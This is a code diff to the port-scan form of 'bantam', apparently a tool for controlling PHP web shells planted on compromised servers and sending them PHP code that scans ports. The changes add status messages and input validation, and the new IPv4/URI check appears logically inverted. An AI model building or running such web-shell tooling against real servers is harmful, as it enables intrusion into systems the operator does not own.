@@ -39,17 +39,22 @@ namespace bantam.Forms
         /// <param name="e"></param>
         private async void btnScan_Click(object sender, EventArgs e)
         {
-            //todo UI THINGS
             if (string.IsNullOrEmpty(textBoxTarget.Text)) {
+                lblStatus.Text = "Invalid IP/Url.";
                 return;
             }
 
-            if (!Helper.IsValidIP(textBoxTarget.Text)) {
+            string target = textBoxTarget.Text;
+
+            if (!Helper.IsValidIPv4(target)
+            || !Helper.IsValidUri(target)) {
+                lblStatus.Text = "Invalid IP/Url.";
                 return;
             }
 
             if (string.IsNullOrEmpty(textBoxStartPort.Text)
              || string.IsNullOrEmpty(textBoxEndPort.Text)) {
+                lblStatus.Text = "Invalid port.";
                 return;
             }
 
@@ -59,12 +64,13 @@ namespace bantam.Forms
             if (startPort > endPort 
              || endPort <= 0 || startPort <= 0
              || startPort > PORT_MAX || endPort > PORT_MAX) {
+                lblStatus.Text = "Invalid port.";
                 return;
             }
 
             btnScan.Enabled = false;
 
-            string windowTitle = "Open Ports ( " + textBoxTarget.Text + " )";
+            string windowTitle = "Open Ports ( " + target + " )";
             RichTextBox rtb = GuiHelper.RichTextBoxDialog(windowTitle, string.Empty);
 
             int shellsCount = checkedListBoxShells.CheckedItems.Count;
@@ -97,9 +103,11 @@ namespace bantam.Forms
                 string shellUrl = checkedListBoxShells.GetItemText(checkedItem);
 
                 string responseText = "[" + shellUrl + "] - returned ports (" + scannedRange + ") - \r\n";
-                string phpCode = PhpBuilder.PortScanner(textBoxTarget.Text, portsCode, encryptResponse);
+                string phpCode = PhpBuilder.PortScanner(target, portsCode, encryptResponse);
 
-                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)EncryptionHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, false, rtb, responseText);
+                lblStatus.Text = "Scanning.";
+
+                BantamMain.ExecutePHPCodeDisplayInRichTextBox(shellUrl, phpCode, windowTitle, encryptResponse, (int)CryptoHelper.RESPONSE_ENCRYPTION_TYPES.OPENSSL, false, rtb, responseText);
 
                 btnScan.Enabled = true;
             }
